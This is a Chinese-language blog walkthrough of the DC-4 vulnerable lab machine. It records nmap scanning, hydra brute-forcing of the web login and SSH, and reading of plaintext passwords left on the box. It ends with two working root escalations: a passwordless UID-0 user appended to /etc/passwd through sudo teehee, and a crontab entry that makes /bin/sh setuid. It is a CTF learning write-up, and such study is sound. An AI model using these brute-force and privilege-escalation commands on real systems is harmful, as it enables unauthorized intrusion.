<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="DC-4靶机渗透实战"><meta name="keywords" content="靶机渗透"><meta name="author" content="bb,shuiyue75381@gmail.com"><meta name="copyright" content="bb"><title>DC-4靶机渗透实战【bb的博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!--link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!--link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!--script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"X7RY6NGU4G","apiKey":"bf7ed65264918bbc03f12b4cc1212d85","indexName":"myblog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
}</script></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#靶机介绍"><span class="toc-number">1.</span> <span class="toc-text">靶机介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透实战"><span class="toc-number">3.</span> <span class="toc-text">渗透实战</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">bb</div><div class="author-info-description">This is myblog!</div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/bbkali" target="_blank">GitHub<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="mailto:shuiyue75381@gmail.com" target="_blank">E-Mail<i class="icon-dot bg-color10"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1019593584&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color5"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">85</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">66</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">33</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">bb的博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">DC-4靶机渗透实战</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-02-05 | 更新于 2020-02-05</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/靶机渗透/">靶机渗透</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/靶机渗透/">靶机渗透</a></div></div></div><div class="main-content"><h3 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h3><p>这次的靶机渗透实战是一个找寻靶机中的flag的过程，并以获得最终的flag为目标。<br>靶机下载地址:<a href="http://www.five86.com/dc-4.html" target="_blank" rel="noopener">http://www.five86.com/dc-4.html</a></p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>直接上nmap进行扫描</p>
<blockquote>
<p>nmap -sV -A 172.16.0.16 -oN dc.nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:93:30:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-13-24-16" alt="2020-2-5-13-24-16"></p>
<p><strong>可知开放22、80端口，linux主机 web是一个登录框 考虑万能密码 注入 爆破</strong><br><a id="more"></a></p>
<h3 id="渗透实战"><a href="#渗透实战" class="headerlink" title="渗透实战"></a>渗透实战</h3><ol>
<li>页面提示是admin的登录框，直接拿admin进行爆破</li>
</ol>
<ul>
<li>可以使用hydra、burpsuit爆破，以hydra为例<blockquote>
<p>hydra -l admin -P /usr/share/john/password.lst -f 172.16.0.16 http-post-form “/login.php:username=^USER^&amp;password=^PASS^:S=logout” -vV</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[VERBOSE] Page redirected to http://172.16.0.16/index.php</span><br><span class="line">[VERBOSE] Page redirected to http://172.16.0.16/index.php</span><br><span class="line">[VERBOSE] Page redirected to http://172.16.0.16/index.php</span><br><span class="line">[80][http-post-form] host: 172.16.0.16   login: admin   password: happy</span><br><span class="line">[STATUS] attack finished for 172.16.0.16 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>直接爆出账号密码</p>
<ol start="2">
<li>同时用sqlmap简单测试下是否有注入漏洞<blockquote>
<p>sqlmap -u <a href="http://172.16.0.16/" target="_blank" rel="noopener">http://172.16.0.16/</a> –data “username=admin&amp;password=admin” –thread 10 –batch –dbs<br>发现没有注入漏洞</p>
</blockquote>
</li>
<li>直接账号登录后台，有命令执行窗口，发现有4个用户<br><img src="https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-13-48-44" alt="2020-2-5-13-48-44"><blockquote>
<p>root charles jim sam</p>
</blockquote>
</li>
</ol>
<ul>
<li>查看用户家目录文件,只有jim下有文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">You have selected: ls -R /home/</span><br><span class="line"></span><br><span class="line">/home/:</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br><span class="line"></span><br><span class="line">/home/charles:</span><br><span class="line"></span><br><span class="line">/home/jim:</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line"></span><br><span class="line">/home/jim/backups:</span><br><span class="line">old-passwords.bak</span><br><span class="line"></span><br><span class="line">/home/sam:</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>有个老密码字典，应该是提供给爆破ssh用</li>
<li>mbox 猜测是有邮件信息</li>
</ul>
<ol start="4">
<li>拿着密码字典去爆破ssh<blockquote>
<p>hydra -L users.txt -P jimpass.txt ssh://172.16.0.16 -t 6 -f -vV</p>
</blockquote>
</li>
</ol>
<ul>
<li>得到用户 jim 密码 jibril04，SSH登陆，登陆提示 邮件，查看/var/mail查看邮件内有charles的密码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 172.16.0.16   login: jim   password: jibril04</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">im@dc-4:/var/mail$ cat jim </span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">        id 1hCjIX-0000kO-Qt</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&apos;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charle</span><br></pre></td></tr></table></figure>
<ul>
<li><p>查看test.sh文件，发现是个小脚本文件，猜测后续能用上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ cat test.sh </span><br><span class="line">#!/bin/bash</span><br><span class="line">for i in &#123;1..5&#125;</span><br><span class="line">do</span><br><span class="line"> sleep 1</span><br><span class="line"> echo &quot;Learn bash they said.&quot;</span><br><span class="line"> sleep 1</span><br><span class="line"> echo &quot;Bash is good they said.&quot;</span><br><span class="line">done</span><br><span class="line"> echo &quot;But I&apos;d rather bash my head against a brick wall.&quot;</span><br><span class="line">hellwor</span><br></pre></td></tr></table></figure>
</li>
<li><p>常规操作发现su是有权限的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">jim@dc-4:~$ sudo -l</span><br><span class="line">[sudo] password for jim: </span><br><span class="line">Sorry, user jim may not run sudo on dc-4.</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="5">
<li>切换到charle用户中去,发现有teehee命令可以运行root权限<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>查看teehee命令用法,这是一个将内容添加到文件的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ teehee --h</span><br><span class="line">Usage: teehee [OPTION]... [FILE]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br><span class="line">  -i, --ignore-interrupts   ignore interrupt signals</span><br><span class="line">  -p                        diagnose errors writing to non pipes</span><br><span class="line">      --output-error[=MODE]   set behavior on write error.  See MODE below</span><br><span class="line">      --help     display this help and exit</span><br><span class="line">      --version  output version information and exit</span><br><span class="line"></span><br><span class="line">MODE determines behavior with write errors on the outputs:</span><br><span class="line">  &apos;warn&apos;         diagnose errors writing to any output</span><br><span class="line">  &apos;warn-nopipe&apos;  diagnose errors writing to any output not a pipe</span><br><span class="line">  &apos;exit&apos;         exit on error writing to any output</span><br><span class="line">  &apos;exit-nopipe&apos;  exit on error writing to any output not a pipe</span><br><span class="line">The default MODE for the -p option is &apos;warn-nopipe&apos;.</span><br><span class="line">The default operation when --output-error is not specified, is to</span><br><span class="line">exit immediately on error writing to a pipe, and diagnose errors</span><br><span class="line">writing to non pipe outputs.</span><br><span class="line"></span><br><span class="line">GNU coreutils online help: &lt;http://www.gnu.org/software/coreutils/&gt;</span><br><span class="line">Full documentation at: &lt;http://www.gnu.org/software/coreutils/tee&gt;</span><br><span class="line">or available locally via: info &apos;(coreutils) tee invocation&apos;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="6">
<li>提权方法，利用teehee加载内容到文件中获取root权限</li>
</ol>
<ul>
<li><p>/etc/passwd文件</p>
<ul>
<li>新建一个具有和root一样大的权限的用户<blockquote>
<p>echo “admin::0:0:admin::/bin/bash”|sudo teehee -a /etc/passwd<br>#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</p>
</blockquote>
</li>
<li>直接拿到root权限获取到最终的flag文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ echo &quot;admin::0:0:admin::/bin/bash&quot;|sudo teehee -a /etc/passwd</span><br><span class="line">    admin::0:0:admin::/bin/bash</span><br><span class="line">    charles@dc-4:~$ cat /etc/passwd</span><br><span class="line">    root:x:0:0:root:/root:/bin/bash</span><br><span class="line">    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">    bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">    sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">    sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">    games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">    _apt:x:104:65534::/nonexistent:/bin/false</span><br><span class="line">    messagebus:x:105:109::/var/run/dbus:/bin/false</span><br><span class="line">    sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">    nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false</span><br><span class="line">    charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash</span><br><span class="line">    jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash</span><br><span class="line">    sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">    Debian-exim:x:108:112::/var/spool/exim4:/bin/false</span><br><span class="line">    admin::0:0:admin::/bin/bash</span><br><span class="line">    charles@dc-4:~$ su admin</span><br><span class="line">root@dc-4:/home/charles# whoami</span><br><span class="line">    root</span><br><span class="line">root@dc-4:/home/charles# cd /root</span><br><span class="line">root@dc-4:/root# ls</span><br><span class="line">    flag.txt</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>/etc/crontab文件</p>
<ul>
<li><p>通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</p>
<blockquote>
<p>cat crontab # 可见文件有格式将授权命令写入该文件授权root bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:/home/jim$ cat /etc/crontab</span><br><span class="line"># /etc/crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&apos;t have to run the `crontab&apos;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow user  command</span><br><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>echo “<em> </em> <em> </em> <em> root chmod 4777 /bin/sh” | sudo teehee -a /etc/crontab<br>时间部分全部填写为</em>，默认这个定时任务每分钟执行一次。通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:/home/jim$ ls -al /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash</span><br><span class="line">charles@dc-4:/home/jim$ /bin/sh</span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"># ls /root</span><br><span class="line">flag.txt</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
</li>
</ul>
<p>最终打开的flag文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@dc-4:/root# cat flag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:shuiyue75381@gmail.com">bb</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="http://bbkali.github.io/2020/02/05/DC-4靶机渗透实战/">http://bbkali.github.io/2020/02/05/DC-4靶机渗透实战/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://bbkali.github.io">bb的博客</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2020/02/05/DC-5靶机渗透实战/"><i class="fas fa-angle-left">&nbsp;</i><span>DC-5靶机渗透实战</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2020/02/04/DC-2靶机渗透实战/"><span>DC-2靶机渗透实战</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2019 ～ 2020 By bb</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div 